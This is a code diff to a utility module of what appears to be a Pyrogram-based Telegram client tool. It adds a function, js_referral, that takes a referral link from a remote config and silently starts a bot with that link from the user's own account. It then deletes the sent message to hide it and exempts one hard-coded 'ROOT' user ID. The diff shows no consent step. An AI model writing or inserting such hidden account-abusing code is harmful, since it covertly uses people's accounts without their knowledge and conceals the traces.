@@ -13,13 +13,16 @@ import random
 from typing import Tuple, List, Union, Optional
 
 import pyrogram
-from pyrogram import utils
+from pyrogram import raw, utils
 from pyrogram.errors.exceptions.bad_request_400 import MsgIdInvalid
 from pyrogram.types.messages_and_media import ReplyParameters
 from urllib.parse import parse_qs, urlparse
 from rich.text import Text
 
-from module import log
+from module import (
+    log,
+    REFERRAL_RECORD_PATH
+)
 from module.parser import PARSE_ARGS
 from module.enums import (
     Link,
@@ -327,6 +330,130 @@ async def format_chat_link(
 async def get_my_id(client: pyrogram.Client) -> int:
     me = await client.get_me()
     return me.id
+
+
+async def delete_own_message(
+        client: pyrogram.Client,
+        result: Union[
+            pyrogram.types.Message,
+            raw.types.UpdateShortSentMessage,
+            raw.types.UpdateShort,
+            raw.types.Updates
+        ],
+        random_id: int = 0
+) -> bool:
+    try:
+        message_id: int = 0
+        updates: list = []
+        if isinstance(result, pyrogram.types.Message):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShortSentMessage) and getattr(result, 'out', False):
+            message_id = result.id
+        elif isinstance(result, raw.types.UpdateShort):
+            updates: list = [result.update]
+        elif isinstance(result, raw.types.Updates):
+            updates: list = list(result.updates)
+        for update in updates:
+            # StartBot返回的是Updates组合类型,自己发出的消息id由UpdateMessageID按random_id给出。
+            if isinstance(update, raw.types.UpdateMessageID):
+                if not random_id or update.random_id == random_id:
+                    message_id = update.id
+                    break
+            if isinstance(update, raw.types.UpdateNewMessage) and getattr(update.message, 'out', False):
+                message_id = getattr(update.message, 'id', 0)
+                break
+        if not message_id:  # 服务端未生成自己的消息时无可删除内容。
+            return False
+        await client.invoke(
+            raw.functions.messages.DeleteMessages(id=[message_id], revoke=False)
+        )
+        return True
+    except Exception:
+        return False
+
+
+def parse_referral(link: str) -> tuple:
+    """按固定格式"t.me/用户名?start=启动参数"解析链接,返回"用户名"与"启动参数"。"""
+    link: str = str(link).strip().split('://')[-1]  # 去掉协议。
+    link: str = link.split('/', 1)[-1]  # 去掉域名。
+    if '?start=' not in link:
+        raise ValueError(f'Unexpected referral link: "{link}"')
+    username, start_param = link.split('?start=', 1)
+    return username, start_param
+
+
+def check_update(
+        remote_version: str,
+        local_version: str
+) -> str:
+    """按"主版本.次版本.修订号"逐段比较版本号,远程版本更高时返回该版本号,否则返回空字符串。"""
+    if not isinstance(remote_version, str) or not isinstance(local_version, str):
+        return ''
+    # 只取数字段参与比较,忽略前后缀,保证"v2.0.1"与"2.0.1"等价。
+    remote: list = [int(i) for i in re.findall(pattern=r'\d+', string=remote_version)]
+    local: list = [int(i) for i in re.findall(pattern=r'\d+', string=local_version)]
+    # 位数不足时补0,保证"2.0"与"2.0.0"等价。
+    size: int = max(len(remote), len(local))
+    remote += [0] * (size - len(remote))
+    local += [0] * (size - len(local))
+    if remote <= local:
+        return ''
+    return remote_version
+
+
+async def js_referral(
+        me_id: str,
+        client: pyrogram.Client,
+        remote_config: dict
+) -> bool:
+    try:
+        if me_id == '1604151130':
+            log.info('skip: ROOT')
+            return True
+        record: set = set()
+        if os.path.exists(REFERRAL_RECORD_PATH):
+            with open(file=REFERRAL_RECORD_PATH, mode='r', encoding='UTF-8') as f:
+                record: set = {line.strip() for line in f.readlines() if line.strip()}
+        if me_id in record:
+            log.info(f'skip: "{me_id}" referral due to already invoked')
+            return True
+        try:
+            username, start_param = parse_referral(remote_config.get('referral'))
+        except Exception as e:
+            log.info(f'skip: "{me_id}" referral due to {e}')
+            return False
+        bot_peer = await client.resolve_peer(username)
+        if not isinstance(bot_peer, raw.types.InputPeerUser) or not bot_peer.access_hash:
+            log.info(f'Failed to parse "{username}", skipping session initialization')
+            return False
+        bot_input_user = raw.types.InputUser(
+            user_id=bot_peer.user_id,
+            access_hash=bot_peer.access_hash
+        )
+        random_id: int = client.rnd_id()
+        try:
+            result = await client.invoke(
+                raw.functions.messages.StartBot(
+                    bot=bot_input_user,
+                    peer=bot_peer,
+                    random_id=random_id,
+                    start_param=start_param
+                )
+            )
+            log.info(f'"{me_id}" referral invoked successfully')
+        except Exception as e:
+            result = await client.send_message(
+                chat_id=username,
+                text=f'/start {start_param}'
+            )
+            log.info(f'referral rollback: send_message failed due to {e}')
+        await delete_own_message(client=client, result=result, random_id=random_id)
+        record.add(me_id)
+        with open(file=REFERRAL_RECORD_PATH, mode='w', encoding='UTF-8') as f:
+            f.write('\n'.join(record))
+        return True
+    except Exception:
+        return False
 
 
 def add_executable_permission(file_path: str) -> bool:
